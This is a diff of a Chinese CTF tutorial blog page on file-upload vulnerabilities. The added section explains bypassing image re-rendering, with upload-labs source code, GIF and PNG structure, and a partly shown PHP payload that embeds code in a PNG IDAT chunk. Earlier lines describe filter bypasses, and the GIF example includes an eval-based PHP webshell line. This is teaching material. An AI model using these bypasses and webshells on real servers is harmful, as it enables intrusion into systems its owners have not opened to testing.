@@ -243,7 +243,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-12-09 23:11:05" itemprop="dateModified" datetime="2025-12-09T23:11:05+08:00">2025-12-09</time>
+      <time title="修改时间：2025-12-10 23:26:52" itemprop="dateModified" datetime="2025-12-10T23:26:52+08:00">2025-12-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -261,14 +261,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.4k</span>
+      <span>14k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>12 分钟</span>
     </span>
 </div>
 
@@ -288,14 +288,14 @@
 </ul>
 <p>简单来说就是上传代码能解析，知道上传到的目录地址，目录下有执行权限。</p>
 <hr>
-<h3 id="Ctf中的文件上传"><a href="#Ctf中的文件上传" class="headerlink" title="Ctf中的文件上传"></a>Ctf中的文件上传</h3><h5 id="前端js过滤"><a href="#前端js过滤" class="headerlink" title="前端js过滤"></a>前端js过滤</h5><p>只进行前端校验，这个太简单就不详细演示了。</p>
+<h2 id="Ctf中的文件上传"><a href="#Ctf中的文件上传" class="headerlink" title="Ctf中的文件上传"></a>Ctf中的文件上传</h2><h3 id="前端js过滤"><a href="#前端js过滤" class="headerlink" title="前端js过滤"></a>前端js过滤</h3><p>只进行前端校验，这个太简单就不详细演示了。</p>
 <p>常见绕过方法就两种：</p>
 <ul>
 <li>1.直接禁用浏览器js绕过</li>
 <li>2.看前端源码校验条件，bp改包绕过。</li>
 </ul>
 <hr>
-<h5 id="中间件配置文件解析绕过"><a href="#中间件配置文件解析绕过" class="headerlink" title="中间件配置文件解析绕过"></a>中间件配置文件解析绕过</h5><p>常见题目主要针对apache和nginx中间件+php的组合。</p>
+<h3 id="中间件配置文件解析绕过"><a href="#中间件配置文件解析绕过" class="headerlink" title="中间件配置文件解析绕过"></a>中间件配置文件解析绕过</h3><p>常见题目主要针对apache和nginx中间件+php的组合。</p>
 <p>.htaccess和.user.ini分别为apache和nginx服务器的配置文件，如果我们更改配置文件信息将我们要上传的恶意文件解析为正常文件，并将这个配置文件上传覆盖原来的再上传恶意文件，就绕过了中间件。</p>
 <ul>
 <li>.htaccess文件</li>
@@ -312,7 +312,7 @@
 <p>​	1.<code>auto_prepend_file</code>函数在PHP文件执行前自动包含指定文件。比如我们把muma.php上传到的目录里有一个名为index.php的文件，访问该文件我们的恶意文件也会被执行。</p>
 <p>​	2.利用文件头伪造在<code>.user.ini</code>文件中添加伪造的文件头（如GIF文件头）以绕过文件头验证，得以绕过中间件。</p>
 <hr>
-<h5 id="content-type（服务端检测–MIME-类型）"><a href="#content-type（服务端检测–MIME-类型）" class="headerlink" title="content-type（服务端检测–MIME 类型）"></a>content-type（服务端检测–MIME 类型）</h5><p><code>Content-Type</code> 是 HTTP 协议中的一个请求&#x2F;响应头字段，用于<strong>指示资源的 MIME 类型</strong>。它的核心作用是告诉接收方（浏览器、服务器等）：「我给你发送的数据是什么格式，请用对应的方式处理」。</p>
+<h3 id="content-type（服务端检测–MIME-类型）"><a href="#content-type（服务端检测–MIME-类型）" class="headerlink" title="content-type（服务端检测–MIME 类型）"></a>content-type（服务端检测–MIME 类型）</h3><p><code>Content-Type</code> 是 HTTP 协议中的一个请求&#x2F;响应头字段，用于<strong>指示资源的 MIME 类型</strong>。它的核心作用是告诉接收方（浏览器、服务器等）：「我给你发送的数据是什么格式，请用对应的方式处理」。</p>
 <p>常用如下：</p>
 <table>
 <thead>
@@ -337,11 +337,11 @@
 <p>如：</p>
 <p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.jpeg" alt=" "></p>
 <p>bp抓包改MIME类型为image&#x2F;png即可绕过</p>
-<h5 id="绕过文件头检测"><a href="#绕过文件头检测" class="headerlink" title="绕过文件头检测"></a>绕过文件头检测</h5><p>1.添加GIF89a进行绕过</p>
+<h3 id="绕过文件头检测"><a href="#绕过文件头检测" class="headerlink" title="绕过文件头检测"></a>绕过文件头检测</h3><p>1.添加GIF89a进行绕过</p>
 <p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2000.09.07.png" alt=" "></p>
 <p>2.也可以创建一个txt文档写入木马改为png后缀，然后010打开加上真正的png文件头，最后bp抓包改png为php实现文件头检测绕过。</p>
 <hr>
-<h5 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h5><p>1.等价扩展名绕过</p>
+<h3 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h3><p>1.等价扩展名绕过</p>
 <table>
 <thead>
 <tr>
@@ -376,7 +376,7 @@
 <p>4.Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为\u0070hp</p>
 <p>5.特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为*.php.或*.php+。</p>
 <hr>
-<h5 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h5><p>这个漏洞是操作系统层面的，由于操作系统一般是由c语言写的。在C语言及受其影响的系统中，空字符（<code>\x00</code>，ASCII值为0）被用作字符串的<strong>结束标志</strong>。其在定义字符串时都是以\0（0x00）作为字符串结尾。所以操作系统在识别字符串时，读到\0就以为读到一个字符串的结尾符号，以此达到绕过的目的。</p>
+<h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h3><p>这个漏洞是操作系统层面的，由于操作系统一般是由c语言写的。在C语言及受其影响的系统中，空字符（<code>\x00</code>，ASCII值为0）被用作字符串的<strong>结束标志</strong>。其在定义字符串时都是以\0（0x00）作为字符串结尾。所以操作系统在识别字符串时，读到\0就以为读到一个字符串的结尾符号，以此达到绕过的目的。</p>
 <p><strong>漏洞条件</strong>：</p>
 <ul>
 <li>php版本&lt;5.3.4</li>
@@ -395,7 +395,7 @@
 <p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2011.46.49.png" alt=" "></p>
 <p>最后webshell工具连一下就行。黑名单同理。</p>
 <hr>
-<h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><p>核心是<strong>并发操作的时序失控</strong>。正常后端对上传的文件处理逻辑是上传→验证→移动 &#x2F; 删除，但是如果这个过程未加锁，攻击者可在 “验证通过前” 访问文件。</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>核心是<strong>并发操作的时序失控</strong>。正常后端对上传的文件处理逻辑是上传→验证→移动 &#x2F; 删除，但是如果这个过程未加锁，攻击者可在 “验证通过前” 访问文件。</p>
 <p>以攻防世界<code>wzsc_文件上传</code>题为例</p>
 <p>构造一个名为muma.php的文件写入以下内容多线程上传到服务器，然后我们一直访问muma.php文件，出现空白页面说明解析，我们成功将shell.php木马上传到了服务器。</p>
 <p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%201.png" alt=" "></p>
@@ -412,7 +412,234 @@
 <p>由于是后门木马所以最后webshell工具连接找flag就行</p>
 <p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%207.png" alt=" "></p>
 <hr>
-<h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5>
+<h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>二次渲染的原理是通过服务器端的相关函数对用户上传的图片进行重新二次渲染，破坏掉原始图片文件中可能隐藏的恶意代码，从而有效防范了图片马等常见文件上传攻击手段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">二次渲染逻辑：</span><br><span class="line">原始上传文件 → 解析器读取 → 内存数据结构 → 生成器编码 → 新文件</span><br><span class="line">   ↓              ↓           ↓           ↓        ↓</span><br><span class="line">  字节流      提取核心数据  像素矩阵/文档树  重新编码   纯净文件</span><br><span class="line">(可能含恶意代码)          (去除非核心数据)  (标准化格式)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>特征：</p>
+<ul>
+<li>图片上传后大小发生变化</li>
+<li>bp抓包图片数据包发生变化</li>
+</ul>
+<p>这里以upload-labs的17关为例，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到源码gif、png、jpg格式图片都能上传，但处理方式有些差异。</p>
+<p>因为后端是php处理的，对不同格式图片php函数处理方式不同。</p>
+<h4 id="GIF图片文件"><a href="#GIF图片文件" class="headerlink" title="GIF图片文件"></a>GIF图片文件</h4><p>使用到GD库的<code>imagecreatefromgif() </code>和 <code>imagegif()</code>函数的二次渲染机制。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">GD库对gif图片处理流程：</span><br><span class="line"><span class="comment">// 读取流程</span></span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="string">&quot;input.gif&quot;</span>);</span><br><span class="line"><span class="comment">// GD实际行为：</span></span><br><span class="line"><span class="comment">// 1. 解析GIF头部和逻辑屏幕描述符</span></span><br><span class="line"><span class="comment">// 2. 解析全局颜色表（如果有）</span></span><br><span class="line"><span class="comment">// 3. 遍历数据块：</span></span><br><span class="line"><span class="comment">//    - 如果是图形控制扩展(0x21F9)→保留</span></span><br><span class="line"><span class="comment">//    - 如果是注释扩展(0x21FE)→忽略不处理！</span></span><br><span class="line"><span class="comment">//    - 如果是应用程序扩展(0x21FF)→部分保留（如动画信息）</span></span><br><span class="line"><span class="comment">//    - 如果是图像描述符→解码LZW数据</span></span><br><span class="line"><span class="comment">// 4. 仅将图像数据加载到内存资源中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入流程</span></span><br><span class="line"><span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>, <span class="string">&quot;output.gif&quot;</span>);</span><br><span class="line"><span class="comment">// GD实际行为：</span></span><br><span class="line"><span class="comment">// 1. 生成标准的GIF89a头部</span></span><br><span class="line"><span class="comment">// 2. 写入逻辑屏幕描述符（基于内存图像）</span></span><br><span class="line"><span class="comment">// 3. 如果原图有全局颜色表→可能重新生成</span></span><br><span class="line"><span class="comment">// 4. 写入图形控制扩展（如有需要）</span></span><br><span class="line"><span class="comment">// 5. 写入图像描述符</span></span><br><span class="line"><span class="comment">// 6. 将内存图像重新编码为LZW数据</span></span><br><span class="line"><span class="comment">// 7. 写入文件结束符</span></span><br><span class="line"><span class="comment">// 注意：不会写入原图的注释扩展！</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gif图片构成：</span><br><span class="line">GIF89a头 (6字节)</span><br><span class="line">逻辑屏幕描述符 (7字节)</span><br><span class="line">全局颜色表 (可选)</span><br><span class="line">扩展块:</span><br><span class="line">  图形控制扩展 (0x21 0xF9)</span><br><span class="line">  注释扩展 (0x21 0xFE) ← 可插入木马</span><br><span class="line">  应用程序扩展 (0x21 0xFF)</span><br><span class="line">图像描述符 (10字节)</span><br><span class="line">图像数据 (LZW压缩)</span><br><span class="line">更多帧（如果是动画GIF）</span><br><span class="line">文件结束符 (0x3B)</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 假设攻击者构造的恶意GIF结构：</span><br><span class="line">$malicious_gif = [</span><br><span class="line">    &quot;GIF89a&quot;,</span><br><span class="line">    &quot;逻辑屏幕描述符&quot;,</span><br><span class="line">    &quot;全局颜色表&quot;,</span><br><span class="line">    &quot;注释扩展块(包含&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;)&quot;,  // ← GD会忽略这个块！</span><br><span class="line">    &quot;图像描述符&quot;,</span><br><span class="line">    &quot;图像数据(LZW压缩)&quot;,</span><br><span class="line">    &quot;文件结束符&quot;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// GD库读取时：</span><br><span class="line">imagecreatefromgif($malicious_gif);  // ← 忽略注释块，只解析图像数据</span><br><span class="line"></span><br><span class="line">// GD库写入时：</span><br><span class="line">imagegif($im, $output_path);  // ← 从内存图像重新生成，不会包含原注释块</span><br><span class="line"></span><br><span class="line">按照这个思路，我们就可以将图片上传后下载下来与原图对比，找到相同的地方也就是注释块位置，插入我们的恶意代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%201221.png" alt=" "></p>
+<p>将插入后的图片再上传</p>
+<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1221212.png" alt=" "></p>
+<p>再将第二次插入后的木马上传后的图片下载打开</p>
+<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/999.png" alt=" "></p>
+<p>可以看到带有后门的图片马成功上传了，后面webshell连接即可。</p>
+<h4 id="PNG图片文件"><a href="#PNG图片文件" class="headerlink" title="PNG图片文件"></a><strong>PNG图片文件</strong></h4><p>先来看看png图片文件组成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PNG签名 (8字节: 89 50 4E 47 0D 0A 1A 0A)</span><br><span class="line">数据块序列：</span><br><span class="line">  IHDR块 (图像头部) - 必选</span><br><span class="line">  PLTE块 (调色板) - 可选</span><br><span class="line">  IDAT块 (图像数据) - 必选，可多个</span><br><span class="line">  IEND块 (图像结束) - 必选</span><br><span class="line">可选辅助块：</span><br><span class="line">  tEXt - 文本数据</span><br><span class="line">  zTXt - 压缩文本</span><br><span class="line">  iTXt - 国际文本</span><br><span class="line">  gAMA - 伽玛值</span><br><span class="line">  tRNS - 透明度</span><br><span class="line">  pHYs - 物理像素尺寸</span><br></pre></td></tr></table></figure>
+
+<h5 id="PNG签名"><a href="#PNG签名" class="headerlink" title="PNG签名"></a>PNG签名</h5><p>每种格式图片的16进制数据是固定的，不同格式图片不一样，所以判断一个文件mimetype类型，更重要的是在<code>签名</code>而不是文件<code>后缀名</code>。</p>
+<p>签名就讲这么多，重点在三个必选的数据块里。</p>
+<h5 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a>数据块</h5><p>png文件里数据块的构成</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>字节数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Length (长度)</td>
+<td>4字节</td>
+<td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td>
+</tr>
+<tr>
+<td>Chunk Type Code (数据块类型码)</td>
+<td>4字节</td>
+<td>数据块类型码由ASCII字母(A-Z和a-z)组成的“数据块符号”</td>
+</tr>
+<tr>
+<td>Chunk Data (数据块数据)</td>
+<td>可变长度</td>
+<td>存储按照Chunk Type Code指定的数据</td>
+</tr>
+<tr>
+<td>CRC (循环冗余检测)</td>
+<td>4字节</td>
+<td>存储用来检测是否有错误的循环冗余码</td>
+</tr>
+</tbody></table>
+<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
+<p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
+<p>CRC: 一种<strong>校验算法</strong>。仅仅用来校验数据的正确性的，这里因为使用了4个字节，说明使用的是CRC32标准算法。</p>
+<h6 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h6><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
+<table>
+<thead>
+<tr>
+<th><strong>域的名称</strong></th>
+<th><strong>字节数</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Width</td>
+<td>4 bytes</td>
+<td>图像宽度，以像素为单位</td>
+</tr>
+<tr>
+<td>Height</td>
+<td>4 bytes</td>
+<td>图像高度，以像素为单位</td>
+</tr>
+<tr>
+<td>Bit depth</td>
+<td>1 bytes</td>
+<td>图像深度： 索引彩色图像：1，2，4或8 灰度图像：1，2，4，8或16 真彩色图像：8或16</td>
+</tr>
+<tr>
+<td>ColorType</td>
+<td>1 bytes</td>
+<td>颜色类型：0：灰度图像, 1，2，4，8或16 2：真彩色图像，8或16 3：索引彩色图像，1，2，4或8 4：带α通道数据的灰度图像，8或16 6：带α通道数据的真彩色图像，8或16</td>
+</tr>
+<tr>
+<td>Compression method</td>
+<td>1 bytes</td>
+<td>压缩方法(LZ77派生算法)</td>
+</tr>
+<tr>
+<td>Filter method</td>
+<td>1 bytes</td>
+<td>滤波器方法</td>
+</tr>
+<tr>
+<td>Interlace method</td>
+<td>1 bytes</td>
+<td>隔行扫描方法：0：非隔行扫描 1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
+</tr>
+</tbody></table>
+<h6 id="PLTE数据块"><a href="#PLTE数据块" class="headerlink" title="PLTE数据块"></a>PLTE数据块</h6><p>调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。</p>
+<p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成：</p>
+<table>
+<thead>
+<tr>
+<th><strong>颜色</strong></th>
+<th><strong>字节</strong></th>
+<th><strong>意义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Red</td>
+<td>1 byte</td>
+<td>0 &#x3D; 黑色, 255 &#x3D; 红</td>
+</tr>
+<tr>
+<td>Green</td>
+<td>1 byte</td>
+<td>0 &#x3D; 黑色, 255 &#x3D; 绿色</td>
+</tr>
+<tr>
+<td>Blue</td>
+<td>1 byte</td>
+<td>0 &#x3D; 黑色, 255 &#x3D; 蓝色</td>
+</tr>
+</tbody></table>
+<p>因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p>
+<h6 id="IDAT数据块"><a href="#IDAT数据块" class="headerlink" title="IDAT数据块"></a>IDAT数据块</h6><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
+<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p>
+<h6 id="IEND数据块"><a href="#IEND数据块" class="headerlink" title="IEND数据块"></a>IEND数据块</h6><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
+<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
+<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
+<p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>将恶意代码写入IDAT数据块</p>
+<p>pyload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义颜色数据数组</span><br><span class="line">$colorData = [</span><br><span class="line">    0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 